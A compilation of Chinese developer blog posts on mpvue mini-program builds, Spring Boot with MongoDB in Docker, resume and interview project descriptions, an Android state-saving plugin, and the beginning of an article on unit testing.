yarn dev xiejun // 本地启动
yarn build xiejun // 打包
开发者工具指向目录
/dist/xiejun

github地址： https://github.com/xiejun-net/mpvue-native

mpvue-native目录结构
|----build
|----config
|----dist 打包后项目目录
    |----<projetc1>
    |----<projetc2>
|----src 源码
    |----assets 通用资源目录
    |----components 组件
    |----pages 公共页面页面
    |----utils 常用库
    |----<project> 对应单个项目的文件
        |----home mpvue页面
            |----assets
            |----App.vue
            |----main.js
        |----native 原生目录
            |----test 小程序原生页面
                |---web.js
                |---web.wxml
                |---web.wxss
                |---web.json
        |----app.json 路径、分包
        |----App.vue
        |----main.js mpvue项目入口文件
|----static 静态文件
|----package.json
拷贝旧项目到根目录下
 new CopyWebpackPlugin([
    {
    from: path.resolve(__dirname, `../src/${config.projectName}/native`),
    to: "",
    ignore: [".*"]
    }
]),
入口及页面
const appEntry = { app: resolve(`./src/${config.projectName}/main.js`) } // 各个项目入口文件
const pagesEntry = getEntry(resolve('./src'), 'pages/**/main.js') // 各个项目的公共页面
const projectEntry = getEntry(resolve('./src'), `${config.projectName}/**/main.js`) // 某个项目的mpvue页面
const entry = Object.assign({}, appEntry, pagesEntry, projectEntry)
多项目共用页面
参考web中一个项目可以有多个spa，我们也可以一个项目里包含多个小程序，多个小程序之间可以共用组件和公用页面，在某些场景下可以节省很多开发时间和维护时间。
打包的时候根据项目入口打包 yarn dev <project>
分包
旧项目作为主包
其他根据文件夹 pages xiejun 分包作为两个包加载
具体根据实际情况来分
// app.json文件配置 pages 为主包
  "pages": [
    "test/web"
  ],
  "subPackages": [
    {
      "root": "pages",
      "pages": [
        "about/main"
      ]
    },
    { 
      "root": "xiejun", 
      "pages": [
          "home/main"
        ]
    }
  ],
其他有关小程序开发坑和技巧
字体图标的使用

网页我们直接引用css就好//at.alicdn.com/t/font_263892_1oe6c1cnjiofxbt9.css

小程序只需要新建一个css文件把在线的css代码拷贝过来放置全局即可

关于小程序和mpvue生命周期
点此查看mpvue的生命周期
从官方文档上生命周期的图示上可以看到created是在onLaunch之前，也就是说每个页面的created 出发时机都是整个应用开启的时机，所以一般页面里面都是用mouted 来请求数据的。
如何判断小程序当前环境
问题描述
发布小程序的时候经常担心配置错误的服务器环境
而小程序官方没有提供任何关于判断小程序是体验版还是开发版本的api
解决方案
熟悉小程序开发的不难发现小程序https请求的时候的referer是有规律的：https://servicewechat.com/${appId}/${env}/page-frame.html
即链接中包含了当前小程序的appId

开发工具中 appId紧接着的dev是 devtools
设备上 开发或者体验版 appId紧接着的env是 0
设备上 正式发布版本 appId紧接着的env是数字 如： 20 发现是小程序的发布版本次数，20代表发布了20次

由此我们可以通过env 这个参数来判断当前是什么环境，
前端是无法获取到referer的，所以需要后端提供一个接口,返回得到referer
代码
// https://servicewechat.com/${appId}/${env}/page-frame.html
// 默认是正式环境，微信官方并没有说referer规则一定如此，保险起见 try catch
async getEnv() {
    try {
        let referer = await userService.getReferer() // 接口获取referer
        let flag = referer.match(/wx2312312312\/(\S*)\/page-frame/)[1]
        if (flag === 'devtools') { // 开发工具
            // setHostDev()
        } else if (parseInt(flag) > 0) { // 正式版本
            // setHostPro()
        } else { // 开发版本和体验版本
            // setHostTest()
        }
    } catch (e) {
        console.log(e)
    }
}
Promise
官方文档上说Promise 都支持
实际测试发现其实在ios8上是有问题的
所以request.js
import Es6Promise from 'es6-promise'
Es6Promise.polyfill()
wx.navigateto返回层级问题
官方文档是说目前可以返回10层
实际情况是在某些机型上只能返回5层 和原来一样
所以最好使用wx.navigateto跳转不超过5层
压缩兼容问题
在微信开发者工具上传代码的时候
务必把项目ES6转ES5否则会出现兼问题

个人公众号:程序员很忙（xiejun_asp）



********************************************************************************************************************************************************************************************************
Spring Boot （八）MyBatis + Docker + MongoDB 4.x
一、MongoDB简介
1.1 MongoDB介绍
MongoDB是一个强大、灵活，且易于扩展的通用型数据库。MongoDB是C++编写的文档型数据库，有着丰富的关系型数据库的功能，并在4.0之后添加了事务支持。
随着存储数据量不断的增加，开发者面临一个困难：如何扩展数据库？而扩展数据库分为横向扩展和纵向扩展，纵向扩展就是使用计算能力更强大的机器，它的缺点就是：机器性能的提升有物理极限的制约，而且大型机通常都是非常昂贵的，而MongoDB的设计采用的是横向扩展的模式，面向文档的数据模型使它很容易的在多台服务器上进行数据分割。MongoDB能自动处理夸集群的数据和负载，自动重新分配文档，这样开发者就能集中精力编写应用程序，而不需要考虑如果扩展的问题。

1.2 MongoDB安装
MongoDB的安装简单来说分为两种：

官网下载对应物理机的安装包，直接安装
使用Docker镜像，安装到Docker上

推荐使用第二种，直接使用MongoDB镜像安装到Docker上，这样带来的好处是：

安装简单、方便，且快速
更容易进行数据迁移，使用Docker可以很容易的导入和导出整个MongoDB到任何地方

所以本文将重点介绍MongoDB在Docker上的安装和使用。
如果想要直接在物理机安装Docker，可以查看我之前的一篇文章《MongoDB基础介绍安装与使用》：https://www.cnblogs.com/vipstone/p/8494347.html
1.3 Docker上安装MongoDB
在Docker上安装软件一般需要两步：

pull（下载）对应的镜像（相对于下载软件）
装载镜像到容器（相对于安装软件）

1.3.1 下载镜像
下载镜像，需要到镜像市场：https://hub.docker.com/，如要要搜索的软件“mongo”，选择官方镜像“Official”，点击详情，获取相应的下载方法，我们得到下载MongoDB的命令如下：

docker pull mongo:latest

1.3.2 装载镜像到容器
使用命令：

docker run --name mongodb1 -p 27018:27017 -d mongo:latest


--name 指定容器名称
-p 27018:27017 映射本地端口27018到容器端口27017
-d 后台运行
mongo:latest 镜像名称和标签

使用“docker images”查看镜像名称和标签，如下图：

容器装载成功之后，就可以使用Robo 3T客户端进行连接了，是不需要输入用户名和密码的，如下图：

表示已经连接成功了。
Robo 3T为免费的连接MongoDB的数据库工具，可以去官网下载：https://robomongo.org/download
1.3.3 开启身份认证
如果是生成环境，没有用户名和密码的MongoDB是非常不安全的，因此我们需要开启身份认证。
Setp1：装载容器
我们还是用之前下载的镜像，重新装载一个容器实例，命令如下：

docker run --name mongodb2 -p 27019:27017 -d mongo:latest --auth

其中“--auth”就是开启身份认证。
装载完身份认证成功容器之后，我们需要进入容器内部，给MongoDB设置用户名和密码。
Setp2：进入容器内部

docker exec -it  bash

Setp3：进入mongo命令行模式

mongo admin

Setp4：创建用户

db.createUser({ user: 'admin', pwd: 'admin', roles: [ { role: "userAdminAnyDatabase", db: "admin" } ] });

创建的用户名为“admin”密码为“admin”，指定的数据库为“admin”。
这个时候，我们使用Robo 3T 输入相应的信息进行连接，如下图：

表示已经连接成功了。
1.3.4 创建数据库设置用户
上面我们用“admin”账户使用了系统数据库“admin”，通常在生成环境我们不会直接使用系统的数据库，这个时候我们需要自己创建自己的数据库分配相应的用户。
Setp1：首先需要进入容器

docker exec -it  bash

Setp2：创建数据库

use testdb

如果没有testdb就会自动创建数据库。
Setp3：创建用户分配数据库

db.createUser({ user: 'admin', pwd: 'admin', roles: [ { role: "readWrite", db: "testdb" } ] });

其中 role: "readWrite" 表式给用户赋值操作和读取的权限，当然增加索引、删除表什么的也是完全没有问题的。
到目前为止我们就可以使用admin/admin操作testdb数据库了。
1.3.5 其他Docker命令
删除容器：docker container rm 
停止容器：docker stop 
启动容器：docker start 
查看运行是容器：docker ps
查询所有的容器：docker ps -a
二、MyBatis集成MongoDB
Spring Boot项目集成MyBatis前两篇文章已经做了详细的介绍，这里就不做过多的介绍，本文重点来介绍MongoDB的集成。
Setp1：添加依赖
在pom.xml添加如下依赖：
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-data-mongodb</artifactId>
</dependency>
Setp2：配置MongoDB连接
在application.properties添加如下配置：
spring.data.mongodb.uri=mongodb://username:pwd@172.16.10.79:27019/testdb
Setp3：创建实体类
import java.io.Serializable;

public class User implements Serializable {
    private Long id;
    private String name;
    private int age;
    private String pwd;
    //...略set、get
}

Setp4：创建Dao类
import com.hello.springboot.entity.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.mongodb.core.MongoTemplate;
import org.springframework.data.mongodb.core.query.Criteria;
import org.springframework.data.mongodb.core.query.Query;
import org.springframework.data.mongodb.core.query.Update;
import org.springframework.stereotype.Component;
import java.util.List;

@Component
public class UserDao {
    @Autowired
    private MongoTemplate mongoTemplate;
    /**
     * 添加用户
     * @param user User Object
     */
    public void insert(User user) {
        mongoTemplate.save(user);
    }

    /**
     * 查询所有用户
     * @return
     */
    public List<User> findAll() {
        return mongoTemplate.findAll(User.class);
    }

    /**
     * 根据id 查询
     * @param id
     * @return
     */
    public User findById(Long id) {
        Query query = new Query(Criteria.where("id").is(id));
        User user = mongoTemplate.findOne(query, User.class);
        return user;
    }

    /**
     * 更新
     * @param user
     */
    public void updateUser(User user) {
        Query query = new Query(Criteria.where("id").is(user.getId()));
        Update update = new Update().set("name", user.getName()).set("pwd", user.getPwd());
        mongoTemplate.updateFirst(query, update, User.class);
    }

    /**
     * 删除对象
     * @param id
     */
    public void deleteUserById(Long id) {
        Query query = new Query(Criteria.where("id").is(id));
        mongoTemplate.remove(query, User.class);
    }

}

Setp4：创建Controller
import com.hello.springboot.dao.IndexBuilderDao;
import com.hello.springboot.dao.UserDao;
import com.hello.springboot.entity.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.servlet.ModelAndView;

@RestController
@RequestMapping("/")
public class UserController {
    @Autowired
    private UserDao userDao;

    @RequestMapping("/")
    public ModelAndView index() {
        User user = new User();
        user.setId(new Long(1));
        user.setAge(18);
        user.setName("Adam");
        user.setPwd("123456");
        userDao.insert(user);

        ModelAndView modelAndView = new ModelAndView("/index");
        modelAndView.addObject("count", userDao.findAll().size());
        return modelAndView;
    }
}

Setp5：创建页面代码
<html>
<head>
    <title>王磊的博客</title>
</head>
<body>
Hello ${count}
</body>
</html>
到此为止已经完成了MongoDB的集成，启动项目，输入“http://localhost:8080/”去数据库查看插入的数据吧。
正常插入数据库如下图：

三、MongoDB主键自增
细心的用户可能会发现，虽然MongoDB已经集成完了，但插入数据库的时候user的id是手动set的值，接下来我们来看怎么实现MongoDB中的id自增。
3.1 实现思路
MongoDB 实现id自增和Spring Boot JPA类似，是在数据库创建一张表，来记录表的“自增id”，只需要保证每次都增加的id和返回的id的原子性，就能保证id实现“自增”的功能。
3.2 实现方案
有了思路之后，接下来我们来看具体的实现方案。
3.2.1 创建实体类
import org.springframework.data.annotation.Id;
import org.springframework.data.mongodb.core.mapping.Document;

@Document(collection = "IndexBuilder")
public class IndexBuilder {
    @Id
    private String id;
    private Long seq;
    //..省略get、set方法
}
其中collection = "IndexBuilder"是指数据库的集合名称，对应关系型数据库的表名。
3.2.2 创建Dao类
import com.hello.springboot.entity.IndexBuilder;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.mongodb.core.MongoOperations;
import org.springframework.data.mongodb.core.query.Update;
import org.springframework.stereotype.Component;
import static org.springframework.data.mongodb.core.FindAndModifyOptions.options;
import static org.springframework.data.mongodb.core.query.Criteria.where;
import static org.springframework.data.mongodb.core.query.Query.query;

@Component
public class IndexBuilderDao {
    @Autowired
    private MongoOperations mongo;
    /**
     * 查询下一个id
     * @param collectionName 集合名
     * @return
     */
    public Long getNextSequence(String collectionName) {
        IndexBuilder counter = mongo.findAndModify(
                query(where("_id").is(collectionName)),
                new Update().inc("seq", 1),
                options().returnNew(true).upsert(true),
                IndexBuilder.class);
        return counter.getSeq();
    }
}
3.2.3 使用“自增”的id
User user = new User();
user.setId(indexBuilderDao.getNextSequence("user"));
//...其他设置
核心代码：indexBuilderDao.getNextSequence("user") 使用“自增”的id，实现id自增。
到此为止，已经完成了MongoDB的自增功能，如果使用正常，数据库应该是这样的：

数据库的IndexBuilder就是用来记录每个集合的“自增id”的。
MongoDB集成的源码：https://github.com/vipstone/springboot-example/tree/master/springboot-mybatis-mongodb

********************************************************************************************************************************************************************************************************
再论面试前准备简历上的项目描述和面试时介绍项目的要点
    前几天我写了篇文章，在做技术面试官时，我是这样甄别大忽悠的——如果面试时你有这样的表现，估计悬，得到了大家的广泛关注，一度上了最多评论榜。不过，也收到了4个反对，也有有朋友说：”简直不给人活路！”，我可以想象是哪些朋友给的反对。
   由于项目介绍是面试中的重头戏，一些技术问题会围绕你介绍的项目展开，你也可以在介绍项目时亮出你的优势。所以，在准备面试的时候，你可以刷题，但首先得准备好你的项目介绍，因为这关系到你面试的成败，文本就将围绕这点展开。
    如果在简历中的项目经验是真实的，那么本文给出的技巧一定能提升面试官对你的评价，毕竟你不仅要能力强，更要让面试官感觉出这点。如果你的项目经历是虚构的，那么我也不能阻止你阅读本文。如果你用虚构的项目经验外加你的（忽悠）本事外加本文给出的技巧进了某个公司，我想这个公司的面试官也怨不到我头上，毕竟面试技术是中立的，就看被谁用。
     开场白结束，正文开始。
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
1 面试前，回顾下你最近的项目经验，在对比下职位介绍，在简历中多列些契合点
    比如某个职位介绍里，要求候选人有Spring Boot相关经验，数据库要会Oracle，而且需要有分布式组件，比如nginx，dubbo等的相关经验，那么你就得回顾下你上个或之前的项目，是否用到过同样的或类似的技术，如果有，那么就得加到简历上，这些技术无需在简历上展开，但得结合项目具体需求写。
    一般的写法，在项目里，我用到了dubbo，redis等的技术。 
    比较好的写法，在项目里的订单管理模块里，我们是用dubbo的方式调用了客户管理系统里的方法，调用的时候我们还考虑到了超时等的异常情况。在页面展示部分，我们用redis缓存了商品信息，redis是用主从热备。
    对比上述两种写法，很明显，第二种写法明显更有说服力，因为其中列出了只有用过才知道的点，这样就能向面试官证明你确实用过相关技术。
    类似的，在职位介绍里提到的技术，最好都用同样的方法写到简历中。不过这里请注意，过犹不及，比如职位介绍里提到了5个技术，你用到了其中的3个，那么你本来也可以通过面试。但如果你自己在项目里拼接了一个实际没用到的技术，那么你就得自己承担后果了。 
2 能帮到你的其实是和职位相关的商业项目经验（含简历疑点和如何避免）
    在本文开头提到的这篇文章里，我已经分享过甄别商业项目的方法。这里我通过些假装商业项目的案例来作为反面教材，以此来说明商业项目经验该怎么描述。
    1 小A，3本学校毕业，计算机系，2年相关经验，之前的公司是一个名不见经传的公司，也就叫xx科技公司，但描述的项目却很高大上，是xx ERP项目。疑点分析：如果某大型公司，或国企，要做ERP或之类的大型项目，或者自己开发，或者让别的大公司开发（因为能出得起这个钱），如果是小公司要用，估计也就拿别人的现成的代码来改，一般不会出这个钱，所以遇到人经历少，公司规模小但项目很有名头的简历，我不能说是一律排除，但我会问很细。
    2 小B，2本计算机系，3年经验，但最近有3个月工作断档的记录。之前的公司是个软件公司，但并非是一个互联网公司，但简历上写的技术非常新潮，比如分布式缓存，dubbo之类的，而且用到了集群。还是这句话，技术是为成本服务，你上个项目规模不大，也不可能有高并发的流量，那么为什么要用这些技术？
    遇到这类简历，我就找些用过就一定能知道的问题来问，比如Redis的基本数据结构，redis如何部署，如何看redis日志，在上述案例中，我就通过这个方法发现该项目其实是个学习项目，而且这个项目是在培训学校里学的。
    3 小C，最近简历上写的是个xx系统（大家可以理解成金融物流保险等），但时间跨度比较可疑，一般来说，做个系统至少10个人左右，而且得大半年，但他简历上写的参与时间是3个月，这和培训学校里的学习时间非常相近。而且，在简历中写的是自己开发了xx系统里的xx模块，用到了redis，logstash等技术。这类简历的疑点是，第一，用了3个月完成了一个项目，而且该项目里有高新技术，且做好了以后马上离职了，这个和实际情况不符，很像培训项目。
    其实简历的疑点不止上述三个，大家也可以换位思考下，如果你是面试官，看到这份简历，会相信吗？很多疑点其实很明显。
    下面我说下真实项目里会出现的情况，写这些内容的目的不是让有些同学把学习项目和培训项目往商业项目上靠，而是让大家的简历更具备说服力。
    1 工作年限比较少的同学，未必会开发完成一个模块或参与一个项目的开发，更多场景下是参与一个维护项目，比如公司一个项目已经上线了，这个项目是历史项目，所以用的技术未必最新，但在维护项目里，其实也会开发一些功能点，该用的技术一个不会少，针对每个模块维护的时间周期也不会太长，比如每个月，针对某个模块上线3个功能点，这样也是合情合理的。
    2 还是这句话，如果有用到比较新的技术，结合业务场景写，比如用到了redis，你是缓存了哪类业务数据，这类业务数据的特点如果真的是符合缓存条件的，那么就加深了你熟悉这个技术的可信度。
    3 你站在项目经理的角度想一下，某个功能如果工期很紧，而且数据量和并发量真的不大，那么为什么要用分布式组件？换句话说，如果你在简历里写的项目背景里，有高并发请求，那么引入分布式组件的可信度就高了。而且，项目经理会让一个工作经验不足的人独立使用技术含量高的组件吗？如果候选人工作经验不多，那么比较可信的描述是，由架构师搭建好组件框架，本人用到其中一些API，但用的时候，对该组件的流程和技术坑非常了解，那么以此证明自己对该组件比较熟悉，这样可信度就非常高了。
     换句话说，你写好简历里的项目描述后，自己先读一遍，如果有夸张的成分，更得多推敲，除了个别虚假简历之外，很多情况下，其实简历是真实的，但没写好，有很多漏洞，被面试官一质疑就慌了，导致面试官认为简历不真实。     
3 沉浸入项目角色，多列些项目管理工具和技术使用细节（就是坑）
    其实证明相关项目经验是商业项目，这仅仅是第一步，更多的时候，你得通过简历中的项目描述，证明你的技能和职位描述相匹配，再进一步，你也可以证明你确实用过一些比较值钱的技术。
    对于项目开发而言，只要项目是真实的，你就一定会经历过一些场景，对于技术而言，只要你用到了，那么一定能说出些“海底针”。所以在写简历时，建议大家列些如下的关键点，以证实真实性。
    1 项目的背景，多少人做？做了多久？用什么工具打包部署发布（比如ant加jenkins）？用到哪些测试工具？用什么来进行版本管理（比如Maven+JIra）？如何打印日志（比如logger）？部署环境时，用到哪个web服务器和数据库（比如spring boot+oracle）。
     这些话在简历中一笔带过也用不了多少文字，但这样不仅能提升项目的真实性，更能展示你的实际技能。
    2 项目的开发模式和开发周期，比如用敏捷开发，那么每一个月作为一个周期，每次发布个若干功能，在每个周期发布前几天，会冻结开发，在开发过程中，会有每天的站会，代码开发完成后，会有code review。
    3  在写技术（尤其是值钱技术）描述时，最好写些细节，比如用到了dubbo，那么可以写需要设置dubbo超时时间和重试次数是1，否则可能会出现调用，如果用到了线程池，那么如何避免线程池中的OOM问题，或者用到了nginx，你就把配置文件里的关键要素写些出来。
    也就是说，你写技术时，不仅得结合项目需求写（即xx技术实现了xx功能），最好再些一些（不用太多）这个技术的用法细节（也未必太深）。面试官其实就看你用到的技术是否和职位匹配，如果职位介绍里的技术点你有都招这点要求写了，至少在筛选简历的时候，你过关的可能性就很大了。
    4 最好写些你解决的实际问题，大而言之，实际问题可以包括配置集群时的要点（比如一定要设置某个配置），小而言之，你可以写如何实现一个功能（比如出统计报表时，你用到了数据库里的行转列的功能）。哪怕是学习项目和培训项目，你运行通现有代码的时候，也会遇到各类的坑，这就更不用说商业项目了。在简历里项目描述部分，你就写上一两个，这样证明真实性的力度绝对会非常高。
    5 加上单元测试和分析问题和排查问题的描述。
      比如，在这个系统里，我是用SoapUI作为自测的工具（或者用JUnit），在测试环境上，如果出现问题，我会到linux里，用less等命令查看日志，再用JMeter等工具查看JVM的调用情况，以此来排查问题。
    这种话在简历中写下大概的描述，给出关键字（比如Jmeter,SOAPUI或职位介绍里出现的关键字）即可，不用展开，但在面试前要准备说辞。
    我知道有些候选人会对项目描述做些改动，比如在最近的项目描述里，加上些之前项目里用到的技术，或者加上职位描述里提到的技术。在这种做法是否恰当，大家自己评估，但如果你在这类技术描述里，加上本部分提到的一些要点，面试官就很难甄别了。
4 事先得排练介绍项目的说辞，讲解时，一定得围绕职位需求要点
    这里说句题外话，我面试过的候选人，从他们的表现来看，很多人是不准备项目描述的，是想到哪说到哪，这样的话，如果你准备了，和你的竞争者相比，你就大占优势了。
    在本文的第3部分里，我给出了5个方面，在简历里，你未必要写全，但在准备面试说辞时，你一定得都准备。
    1 你在项目描述里列到的所有技术点，尤其是热门的以及在职位介绍里提到的技术点，你一定得准备说辞。也是按“技术如何服务需求”以及“技术实现细节”来说，更进一步，你最好全面了解下这个技术的用法。比如nginx如何实现反向代理，该如何设置配置以及lua脚本，如果分布式系统里某个结点失效了，我想在反向代理时去掉，那该怎么在nginx配置里设。针对这个技术的常用问题点，你最好都准备下。
    2 介绍项目时，可以介绍用到哪些技术，但别展开，等面试官来问，所谓放长线钓大鱼。这个效果要比你直接说出来要好很多。
    3 有些基础的技能需求，在职位描述里未必会列，但你一定得掌握。比如通过设计模式优化代码架构，熟悉多线程并发，熟悉数据库调优等。关于这些，你可以准备些说辞，比如在这个项目里，遇到sql过长的情况，我会通过执行计划来调优，如果通过日志发现JVM性能不高，我也能排查问题，然后坐等面试官来问。
   4 开阔你的视野，别让面试官感觉你只会用非常初步的功能点。比如你项目里用到了dubbo，但在项目里，你就用到了简单的调用，那么你就不妨搜下该技术的深入技术以及别人遇到的坑，在面试过程中，你也可以找机会说出来。
5 在项目介绍时多准备些“包袱”
    刚才也提到了，在介绍项目里，你可以抛些亮点，但未必要展开，因为介绍项目时，你是介绍整体的项目以及用到的技术，如果你过于偏重介绍一个技术，那么面试官不仅会认为你表达沟通方面有问题，而且还会认为这个技术你事先准备过。
    如下列些大家可以抛出的亮点：
    1 底层代码方面，大家可以说，了解Spring IOC或Nginx（或其它任何一个职位介绍里提到的技术）的底层实现代码。面试时，大家可以先通过UML图的形式画出该技术的重要模块和过程流程，再通过讲述其中一个模块的代码来说明你确实熟悉这个技术的底层实现。
    2 数据库调优方面。比如oracle，你可以用某个长SQL为例，讲下你通过执行计划看到有哪些改进点，然后如何改进，这样的例子不用多，2,3个即可，面试时估计面试官听到其中一个以后就会认为你非常熟悉数据调优了。
   3 JVM调优和如何通过设计模式改善代码结构，在Java核心技术及面试指南里我已经提到了，这里就不展开了。
   4 架构层面的调优方法，比如通过分库分表，通过数据库集群，或者通过缓存。
   其实关于亮点的内容，我在Java Web轻量级开发面试教程里，也有详细描述。这里想说的是，大家可以准备的亮点绝不止上述4个，大家可以从调优（比如通过分布式优化并发情况场景）和技术架构（比如SSM， 分布式消息队列）上准备。再啰嗦一句，职位介绍里提到的技能点，比如Redis，大家还可以用熟悉底层实现代码来作为“亮点”，比如介绍项目时，轻描淡写地说句，我熟悉Redis底层代码（当然也可以写到简历上），然后等面试官来问时，动笔说下。 
6 别让面试官感觉你只会使用技术
    按照上述的建议，只要你能力可以（哪怕可上可下），你通过技术面试的可能性就大大增加了。但面试时，如果你表现出如下的软实力，比如在简历上项目描述部分写上，或介绍项目时说出，那么面试官甚至会感觉你很优秀。
    1 该项目的工期比较紧，我会合理安排时间，必要时，我会在项目经理安排下周末加班。（体现你的责任心）
    2 这个项目里，用到了分布式组件技术，刚开始我对此不熟悉，但我会主动查资料，遇到问题，我会及时问架构师，解决问题后，我会主动在组内分享。（有责任心，学习能力强，有团队合作意识，有分享精神）
    3 遇到技术上或需求上的疑点或是我个人无法完成问题点，我会主动上报，不会坐等问题扩大。
    4 在开发项目的过程中，通过学习，我慢慢掌握了Git+Ant+Jeninks的打包发布部署流程，现在，我会负责项目里的打包工作。或者说，在组内，我会每天观察长SQL脚本和长Dubbo调用的情况，如果遇到问题，我会每天上报，然后大家一起解决问题。（不仅能完成本职工作，而且还能积极分担项目组里的其它工作）
    5 如果出现问题，我主动会到linux里通过xxx命令查看日志，然后排查问题。（不仅积极主动，而且掌握了排查问题的方法）
    6 我会和测试人员一起，用xxx工具进行自动化测试，出现问题然后一起解决。（工作积极，而且掌握了测试等的技巧）
    7 在项目里，我会用Sonar等工具扫描代码，出现质量问题，我会和大家一起协商改掉。（具有代码质量管理的意识，而且具有提升代码质量的能力）
 
7 版权说明，总结，求推荐
    本文欢迎转载，转载前请和本人说下，请全文转载并用链接的方式指明原出处。
    本文给出的准备项目描述和说辞的经验，是根据本人以及其它多位资深技术面试官的经验总结而来。如果大家感觉本文多少有帮助，请点击下方的推荐按钮，您的推荐是我写博客的最大动力。如果大家在这方面有问题，可以通过评论问或私下给我发消息，一般我都会回。
********************************************************************************************************************************************************************************************************
不需要再手写 onSaveInstanceState 了，因为你的时间非常值钱
如果你是一个有经验的 Android 程序员，那么你肯定手写过许多 onSaveInstanceState 以及 onRestoreInstanceState 方法用来保持 Activity 的状态，因为 Activity 在变为不可见以后，系统随时可能把它回收用来释放内存。重写 Activity 中的 onSaveInstanceState 方法 是 Google 推荐的用来保持 Activity 状态的做法。

Google 推荐的最佳实践
onSaveInstanceState 方法会提供给我们一个 Bundle 对象用来保存我们想保存的值，但是 Bundle 存储是基于 key - value 这样一个形式，所以我们需要定义一些额外的 String 类型的 key 常量，最后我们的项目中会充斥着这样代码：
static final String STATE_SCORE = "playerScore";
static final String STATE_LEVEL = "playerLevel";
// ...


@Override
public void onSaveInstanceState(Bundle savedInstanceState) {
    // Save the user's current game state
    savedInstanceState.putInt(STATE_SCORE, mCurrentScore);
    savedInstanceState.putInt(STATE_LEVEL, mCurrentLevel);

    // Always call the superclass so it can save the view hierarchy state
    super.onSaveInstanceState(savedInstanceState);
}
保存完状态之后，为了能在系统重新实例化这个 Activity 的时候恢复先前被系统杀死前的状态，我们在 onCreate 方法里把原来保存的值重新取出来：
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState); // Always call the superclass first

    // Check whether we're recreating a previously destroyed instance
    if (savedInstanceState != null) {
        // Restore value of members from saved state
        mCurrentScore = savedInstanceState.getInt(STATE_SCORE);
        mCurrentLevel = savedInstanceState.getInt(STATE_LEVEL);
    } else {
        // Probably initialize members with default values for a new instance
    }
    // ...
}
当然，恢复这个操作也可以在 onRestoreInstanceState 这个方法实现：
public void onRestoreInstanceState(Bundle savedInstanceState) {
    // Always call the superclass so it can restore the view hierarchy
    super.onRestoreInstanceState(savedInstanceState);

    // Restore state members from saved instance
    mCurrentScore = savedInstanceState.getInt(STATE_SCORE);
    mCurrentLevel = savedInstanceState.getInt(STATE_LEVEL);
}
解放你的双手
上面的方案当然是正确的。但是并不优雅，为了保持变量的值，引入了两个方法 ( onSaveInstanceState 和 onRestoreInstanceState ) 和两个常量 ( 为了存储两个变量而定义的两个常量，仅仅为了放到 Bundle 里面)。
为了更好地解决这个问题，我写了 SaveState 这个插件：

在使用了 SaveState 这个插件以后，保持 Activity 的状态的写法如下：
public class MyActivity extends Activity {

    @AutoRestore
    int myInt;

    @AutoRestore
    IBinder myRpcCall;

    @AutoRestore
    String result;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // Your code here
    }
}
没错，你只需要在需要保持的变量上标记 @AutoRestore 注解即可，无需去管那几个烦人的 Activity 回调，也不需要定义多余的 String 类型 key 常量。
那么，除了 Activity 以外，Fragment 能自动保持状态吗？答案是： Yes！
public class MyFragment extends Fragment {

    @AutoRestore
    User currentLoginUser;

    @AutoRestore
    List<Map<String, Object>> networkResponse;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        // Your code here
    }
}
使用方法和 Activity 一模一样！不止如此，使用场景还可以推广到 View， 从此，你的自定义 View，也可以把状态保持这个任务交给 SaveState ：
public class MyView extends View {

    @AutoRestore
    String someText;

    @AutoRestore
    Size size;

    @AutoRestore
    float[] myFloatArray;

    public MainView(Context context) {
        super(context);
    }

    public MainView(Context context, @Nullable AttributeSet attrs) {
        super(context, attrs);
    }

    public MainView(Context context, @Nullable AttributeSet attrs, int defStyleAttr) {
        super(context, attrs, defStyleAttr);
    }

}
现在就使用 SaveState
引入 SaveState 的方法也十分简单：
首先，在项目根目录的 build.gradle 文件中增加以下内容：
buildscript {

    repositories {
        google()
        jcenter()
    }
    dependencies {
        // your other dependencies

        // dependency for save-state
        classpath "io.github.prototypez:save-state:${latest_version}"
    }
}
然后，在 application 和 library 模块的 build.gradle 文件中应用插件：
apply plugin: 'com.android.application'
// apply plugin: 'com.android.library'
apply plugin: 'save.state'
万事具备！再也不需要写烦人的回调，因为你的时间非常值钱！做了一点微小的工作，如果我帮你节省下来了喝一杯咖啡的时间，希望你可以帮我点一个 Star，谢谢 :)
SaveState Github 地址：https://github.com/PrototypeZ/SaveState

********************************************************************************************************************************************************************************************************
持续集成之单元测试篇——WWH(讲讲我们做单元测试的故事)
持续集成之单元测试篇——WWH(讲讲我们做单元测试的故事)
前言

临近上线的几天内非重大bug不敢进行发版修复，担心引起其它问题(摁下葫芦浮起瓢)
尽管我们如此小心，仍不能避免修改一些bug而引起更多的bug的现象
往往有些bug已经测试通过了但是又复现了
我们明明没有改动过的功能，却出了问题
有些很明显的bug往往在测试后期甚至到了线上才发现，而此时修复的代价极其之大。
测试时间与周期太长并且质量得不到保障
项目与服务越来越多，测试人员严重不足（后来甚至一个研发两个测试人员比）
上线的时候仅仅一轮回归测试就需要几个小时甚至更久
无休止的加班上线。。。

如果你对以上问题非常熟悉，那么我想你的团队和我们遇到了相同的问题。
WWH:Why,What,How为什么要做单元测试，什么事单元测试，如何做单元测试。
一、为什么我们要做单元测试
1.1 问题滋生解决方案——自动化测试
    一门技术或一个解决方案的诞生的诞生，不可能凭空去创造，往往是问题而催生出来的。在我的.NET持续集成与自动化部署之路第一篇(半天搭建你的Jenkins持续集成与自动化部署系统)这篇文章中提到，我在做研发负责人的时候饱受深夜加班上线之苦，其中提到的两个大问题一个是部署问题，另一个就是测试问题。部署问题，我们引入了自动化的部署(后来我们做到了几分钟就可以上线)。我们要做持续集成，剩下的就是测试问题了。

    回归测试成了我们的第一大问题。随着我们项目的规模与复杂度的提升，我们的回归测试变得越来越困难。由于我们的当时的测试全依赖手工测试，我们项目的迭代周期大概在一个月左右，而测试的时间就要花费一半多的时间。甚至版本上线以后做一遍回归测试就需要几个小时的时间。而且这种手工进行的功能性测试很容易有遗漏的地方，因此线上Bug层出不穷。一堆问题困扰着我们，我们不得不考虑进行自动化的测试。
